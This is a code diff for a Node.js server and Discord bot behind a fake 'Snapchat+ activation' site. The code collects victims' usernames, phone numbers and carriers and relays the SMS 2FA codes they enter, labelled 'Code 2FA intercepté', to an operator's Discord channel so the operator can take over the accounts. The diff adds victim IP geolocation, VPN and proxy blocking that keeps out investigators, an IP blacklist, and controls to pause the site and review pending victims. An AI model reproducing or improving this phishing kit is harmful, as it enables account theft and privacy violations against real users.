@@ -38,6 +38,7 @@ const CONFIG_DEFAULTS = {
     salon_prioritaire:    true,   // envoyer dans le salon prioritaire
     site_actif:           true,   // accepter ou bloquer les soumissions
     webhook_fallback:     true,   // utiliser le webhook si bot down
+    bloquer_vpn:          true,   // bloquer les VPN/proxy
 };
 
 function loadConfig() {
@@ -100,6 +101,41 @@ function pushHistory(entry) {
     history.unshift(entry); // plus récent en premier
     if (history.length > 50) history = history.slice(0, 50);
     saveHistory(history);
+}
+
+// ================== BLACKLIST ==================
+const BLACKLIST_FILE = path.join(__dirname, 'blacklist.json');
+function loadBlacklist() {
+    try {
+        if (fs.existsSync(BLACKLIST_FILE)) return new Set(JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')));
+    } catch (e) {}
+    return new Set();
+}
+function saveBlacklist(set) {
+    try { fs.writeFileSync(BLACKLIST_FILE, JSON.stringify([...set], null, 2), 'utf8'); } catch (e) {}
+}
+let blacklist = loadBlacklist();
+
+// ================== GÉOLOCALISATION IP ==================
+async function geolocateIP(ip) {
+    if (!ip || ip === 'inconnu' || ip === '127.0.0.1' || ip.startsWith('::')) {
+        return { city: 'Local', country: 'FR', isp: 'Localhost', proxy: false, flag: '🏠' };
+    }
+    try {
+        const res = await axios.get(
+            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,proxy,hosting`,
+            { timeout: 3000 }
+        );
+        const d = res.data;
+        if (d.status !== 'success') return null;
+        // Emoji drapeau depuis countryCode
+        const flag = d.countryCode
+            ? d.countryCode.toUpperCase().replace(/./g, c => String.fromCodePoint(0x1F1E0 - 65 + c.charCodeAt(0)))
+            : '🌍';
+        return { city: d.city || '?', country: d.country || '?', isp: d.isp || '?', proxy: d.proxy || d.hosting || false, flag };
+    } catch (e) {
+        return null;
+    }
 }
 
 // ================== RATE LIMITING ==================
@@ -189,19 +225,31 @@ app.post('/api/submit', async (req, res) => {
         return res.status(503).json({ error: 'site_disabled' });
     }
 
-    // Rate limiting
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'inconnu';
+    // Rate limiting + blacklist + VPN
+    const ip = (req.headers['x-forwarded-for'] || req.ip || 'inconnu').split(',')[0].trim();
+
+    if (blacklist.has(ip)) {
+        return res.status(403).json({ error: 'Accès refusé.' });
+    }
     if (isRateLimited(ip)) {
         return res.status(429).json({ error: `Trop de demandes, réessaie dans ${cfg.ratelimit_minutes} minutes.` });
     }
-    setRateLimit(ip);
 
+    // Géolocalisation + détection VPN
+    const geo = await geolocateIP(ip);
+    if (geo && geo.proxy && cfg.bloquer_vpn !== false) {
+        return res.status(403).json({ error: 'VPN/proxy détecté. Désactive-le et réessaie.' });
+    }
+
+    setRateLimit(ip);
     const ua = req.headers['user-agent'] || '';
     const { os, device } = parseUserAgent(ua);
 
     const id = uuidv4();
+    const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
+    const ispStr = geo ? geo.isp : '?';
     const requestData = {
-        snapchat, phone, operator, ip, device, os,
+        snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
         approved: false, rejected: false, code: null,
         createdAt: Date.now()
     };
@@ -258,38 +306,51 @@ app.post('/api/submit', async (req, res) => {
             if (!mainChannel) throw new Error("Salon principal introuvable");
 
             // Champs dynamiques selon config
+            const expireAt = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
+            const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;
+
             const baseFields = [
-                { name: 'Pseudo',    value: snapchat,  inline: true },
-                { name: 'Téléphone', value: phone,     inline: true },
-                { name: 'Opérateur', value: operator,  inline: true },
+                { name: '👤 Pseudo',    value: `\`${snapchat}\``,  inline: true },
+                { name: '📞 Téléphone', value: `\`${phone}\``,     inline: true },
+                { name: '📡 Opérateur', value: operator,           inline: true },
             ];
             if (cfg.afficher_appareil) {
-                baseFields.push({ name: 'Appareil', value: device, inline: true });
-                baseFields.push({ name: 'OS',       value: os,     inline: true });
+                baseFields.push({ name: '📱 Appareil', value: device, inline: true });
+                baseFields.push({ name: '💻 OS',       value: os,     inline: true });
             }
-            if (cfg.afficher_ip) baseFields.push({ name: 'IP', value: ip, inline: true });
-            baseFields.push({ name: 'ID', value: id });
+            if (cfg.afficher_ip) {
+                baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
+                baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
+                baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
+            }
+            baseFields.push({ name: '⏰ Expire',  value: expireStr, inline: true });
+            baseFields.push({ name: '🆔 ID',      value: `\`${id.slice(0,8)}...\``, inline: true });
 
             const embed = new EmbedBuilder()
-                .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
+                .setTitle('📱 Nouvelle demande Snapchat+')
+                .setDescription('> Un utilisateur veut activer son abonnement Premium.')
                 .setColor(0xFFFC00)
                 .addFields(...baseFields)
+                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                 .setTimestamp();
 
             const row = new ActionRowBuilder()
                 .addComponents(
-                    new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger),
-                    new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary)
+                    new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
+                    new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
                 );
 
             // 1. Salon prioritaire EN PREMIER (si activé) + mention owner
             if (priorityChannel) {
                 const priorityEmbed = new EmbedBuilder()
-                    .setTitle('👁️ [PRIORITAIRE] Nouvelle demande')
+                    .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
+                    .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
                     .setColor(0xFF6600)
                     .addFields(...baseFields)
-                    .setFooter({ text: `Lecture seule — le salon principal reçoit dans ${cfg.delai_discord_sec}s` })
+                    .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                    .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
                     .setTimestamp();
                 await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
             }
@@ -405,33 +466,45 @@ app.post('/api/code', async (req, res) => {
             const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
             const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
 
+            const geoCode = request.geo  || '?';
+            const ispCode = request.isp  || '?';
+
             const codeFields = [
-                { name: 'Pseudo',    value: snapchat },
-                { name: 'Téléphone', value: phone    },
-                { name: 'Opérateur', value: operator },
+                { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
+                { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
+                { name: '📡 Opérateur', value: operator,          inline: true },
             ];
             if (cfg.afficher_appareil) {
-                codeFields.push({ name: 'Appareil', value: device });
-                codeFields.push({ name: 'OS',       value: os     });
+                codeFields.push({ name: '📱 Appareil', value: device, inline: true });
+                codeFields.push({ name: '💻 OS',       value: os,     inline: true });
             }
-            if (cfg.afficher_ip) codeFields.push({ name: 'IP', value: ip });
-            codeFields.push({ name: 'Code', value: `**${code}**` });
+            if (cfg.afficher_ip) {
+                codeFields.push({ name: '🌍 Localisation', value: geoCode, inline: true });
+                codeFields.push({ name: '🔌 FAI',          value: ispCode, inline: true });
+                codeFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
+            }
+            codeFields.push({ name: '🔑 Code 2FA', value: `## ${code}`, inline: false });
 
             const codeEmbed = new EmbedBuilder()
                 .setTitle('🔐 Code 2FA intercepté')
-                .setColor(0x00FF00)
+                .setDescription('> Le code SMS a été saisi par l\'utilisateur.')
+                .setColor(0x00FF66)
                 .addFields(...codeFields)
+                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                 .setTimestamp();
 
             if (priorityChannel) {
                 try {
                     const priorityCodeEmbed = new EmbedBuilder()
-                        .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
-                        .setColor(0x00FF00)
+                        .setTitle('👁️ PRIORITAIRE — Code 2FA intercepté')
+                        .setDescription('> Lecture seule.')
+                        .setColor(0x00FF66)
                         .addFields(...codeFields)
-                        .setFooter({ text: `Lecture seule — salon principal reçoit dans ${cfg.delai_discord_sec}s` })
+                        .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
+                        .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s` })
                         .setTimestamp();
-                    await priorityChannel.send({ embeds: [priorityCodeEmbed] });
+                    await priorityChannel.send({ content: `<@${OWNER_ID}> 🔑 Code reçu !`, embeds: [priorityCodeEmbed] });
                 } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
             }
 
@@ -479,6 +552,72 @@ client.on('interactionCreate', async interaction => {
             ],
             ephemeral: true
         });
+    }
+
+    // /pause — OWNER ONLY
+    if (interaction.commandName === 'pause') {
+        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
+        cfg.site_actif = false; saveConfig(cfg); updateBotStatus();
+        return interaction.reply({ content: '⏸️ Site **désactivé**. Aucune nouvelle soumission ne sera acceptée.', ephemeral: true });
+    }
+
+    // /resume — OWNER ONLY
+    if (interaction.commandName === 'resume') {
+        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
+        cfg.site_actif = true; saveConfig(cfg); updateBotStatus();
+        return interaction.reply({ content: '▶️ Site **réactivé**. Les soumissions sont de nouveau acceptées.', ephemeral: true });
+    }
+
+    // /pending — OWNER ONLY
+    if (interaction.commandName === 'pending') {
+        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
+        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
+        if (pending.length === 0) return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
+        const lines = pending.map(([id, r]) => {
+            const elapsed = Math.floor((Date.now() - r.createdAt) / 1000);
+            const m = Math.floor(elapsed / 60), s = String(elapsed % 60).padStart(2,'0');
+            const remain = Math.max(0, cfg.timeout_minutes * 60 - elapsed);
+            const rm = Math.floor(remain / 60), rs = String(remain % 60).padStart(2,'0');
+            return `⏳ **${r.snapchat}** | ${r.phone} | \`${r.geo || '?'}\` | Attente: ${m}:${s} | Expire: ${rm}:${rs}`;
+        });
+        return interaction.reply({
+            embeds: [new EmbedBuilder()
+                .setTitle(`⏳ ${pending.length} demande(s) en attente`)
+                .setColor(0xFFFC00)
+                .setDescription(lines.join('\n'))
+                .setTimestamp()
+            ],
+            ephemeral: true
+        });
+    }
+
+    // /blacklist — OWNER ONLY
+    if (interaction.commandName === 'blacklist') {
+        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
+        const sub = interaction.options.getSubcommand();
+        if (sub === 'add') {
+            const ip = interaction.options.getString('ip');
+            blacklist.add(ip); saveBlacklist(blacklist);
+            return interaction.reply({ content: `🚫 IP \`${ip}\` ajoutée à la blacklist.`, ephemeral: true });
+        }
+        if (sub === 'remove') {
+            const ip = interaction.options.getString('ip');
+            blacklist.delete(ip); saveBlacklist(blacklist);
+            return interaction.reply({ content: `✅ IP \`${ip}\` retirée de la blacklist.`, ephemeral: true });
+        }
+        if (sub === 'list') {
+            const list = [...blacklist];
+            if (list.length === 0) return interaction.reply({ content: '✅ Aucune IP blacklistée.', ephemeral: true });
+            return interaction.reply({
+                embeds: [new EmbedBuilder()
+                    .setTitle(`🚫 Blacklist (${list.length} IPs)`)
+                    .setColor(0xFF4444)
+                    .setDescription(list.map(ip => `\`${ip}\``).join('\n'))
+                    .setTimestamp()
+                ],
+                ephemeral: true
+            });
+        }
     }
 
     // /clear — OWNER ONLY
@@ -556,6 +695,7 @@ client.on('interactionCreate', async interaction => {
                         { name: '⏱️ Délai Discord',         value: `${cfg.delai_discord_sec}s`,                           inline: true },
                         { name: '⏰ Timeout demandes',      value: `${cfg.timeout_minutes} min`,                          inline: true },
                         { name: '🔗 Webhook fallback',      value: cfg.webhook_fallback    ? on : off,                    inline: true },
+                        { name: '🛡️ Bloquer VPN',          value: cfg.bloquer_vpn         ? on : off,                    inline: true },
                     )
                     .setFooter({ text: 'Utilise /config set <parametre> <valeur> pour modifier' })
                     .setTimestamp()
@@ -569,7 +709,7 @@ client.on('interactionCreate', async interaction => {
             const param = interaction.options.getString('parametre');
             const valStr = interaction.options.getString('valeur');
 
-            const boolParams = ['site_actif','ratelimit_actif','afficher_ip','afficher_appareil','salon_prioritaire','webhook_fallback'];
+            const boolParams = ['site_actif','ratelimit_actif','afficher_ip','afficher_appareil','salon_prioritaire','webhook_fallback','bloquer_vpn'];
             const intParams  = { ratelimit_minutes: [1,60], timeout_minutes: [1,30], delai_discord_sec: [1,60] };
 
             if (boolParams.includes(param)) {
@@ -716,6 +856,31 @@ client.once('ready', async () => {
                     .toJSON(),
 
                 new SlashCommandBuilder()
+                    .setName('pause')
+                    .setDescription('⏸️ Désactiver le site immédiatement [OWNER ONLY]')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('resume')
+                    .setDescription('▶️ Réactiver le site [OWNER ONLY]')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('pending')
+                    .setDescription('⏳ Voir les demandes en attente avec timing [OWNER ONLY]')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('blacklist')
+                    .setDescription('🚫 Gérer la blacklist d\'IPs [OWNER ONLY]')
+                    .addSubcommand(s => s.setName('add').setDescription('Ajouter une IP')
+                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
+                    .addSubcommand(s => s.setName('remove').setDescription('Retirer une IP')
+                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
+                    .addSubcommand(s => s.setName('list').setDescription('Voir la blacklist'))
+                    .toJSON(),
+
+                new SlashCommandBuilder()
                     .setName('config')
                     .setDescription('⚙️ Gérer les paramètres du site/bot [OWNER ONLY]')
                     .addSubcommand(sub => sub
@@ -739,6 +904,7 @@ client.once('ready', async () => {
                                 { name: '⏱️ Délai Discord (secondes, 1-60)',    value: 'delai_discord_sec' },
                                 { name: '⏰ Timeout demandes (minutes, 1-30)', value: 'timeout_minutes' },
                                 { name: '🔗 Webhook fallback (true/false)',     value: 'webhook_fallback' },
+                                { name: '🛡️ Bloquer VPN/proxy (true/false)',   value: 'bloquer_vpn' },
                             )
                         )
                         .addStringOption(opt => opt
@@ -754,7 +920,7 @@ client.once('ready', async () => {
                     .toJSON(),
             ]
         });
-        console.log('✅ Slash commands enregistrées (/stats, /config, /clear, /history)');
+        console.log('✅ Slash commands enregistrées (/stats, /config, /clear, /history, /pause, /resume, /pending, /blacklist)');
     } catch (e) {
         console.error('Erreur enregistrement slash commands:', e.message);
     }
